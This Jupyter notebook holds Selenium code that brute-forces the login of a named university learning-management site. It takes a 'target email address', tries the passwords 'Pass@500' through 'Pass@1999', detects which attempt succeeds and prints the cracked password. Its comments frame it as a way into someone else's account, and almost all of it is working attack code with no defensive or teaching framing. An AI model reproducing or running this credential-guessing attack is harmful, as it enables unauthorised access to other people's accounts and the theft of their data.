{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.by import By\n",
    "from selenium.webdriver.support.ui import WebDriverWait\n",
    "from selenium.webdriver.support import expected_conditions as EC\n",
    "from selenium.common.exceptions import NoSuchElementException"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def check_for_logout():\n",
    "    try:\n",
    "        browser.find_element_by_id('actionmenuaction-6')\n",
    "    except NoSuchElementException:\n",
    "        return False\n",
    "    return True"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def check_for_error():\n",
    "    try:\n",
    "        browser.find_element_by_id('loginerrormessage')\n",
    "    except NoSuchElementException:\n",
    "        return False\n",
    "    return True"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def logout():\n",
    "    if(check_for_logout()):\n",
    "        dropdown = browser.find_element_by_class_name('userbutton')\n",
    "        dropdown.click()\n",
    "        logout = browser.find_element_by_id('actionmenuaction-6')\n",
    "        logout.click()\n",
    "        return True\n",
    "    else:\n",
    "        return False\n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def login(user, user_pass):\n",
    "    username = browser.find_element_by_id('username')\n",
    "    username.send_keys(user)\n",
    "    password = browser.find_element_by_id('password')\n",
    "    password.send_keys(user_pass)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def click_login():\n",
    "    nextButton = browser.find_element_by_id('loginbtn')\n",
    "    nextButton.click()\n",
    "    \n",
    "    if(not check_for_error()):\n",
    "        return logout()\n",
    "    else:\n",
    "        return False"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "email = \"\" # Write the target email address here\n",
    "browser = webdriver.Chrome()\n",
    "browser.get(('http://lms.bennett.edu.in/login/'))\n",
    "\n",
    "a = [x for x in range(500,2000)] # Target's password range according to you\n",
    "\n",
    "for values in a:\n",
    "    password = \"Pass@\"+str(values)\n",
    "    print(username)\n",
    "    login(email,password)\n",
    "    if(not click_login()):\n",
    "        continue\n",
    "    else:\n",
    "        print(\"The password is \",str(values))\n",
    "        break\n",
    "\n",
    "\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
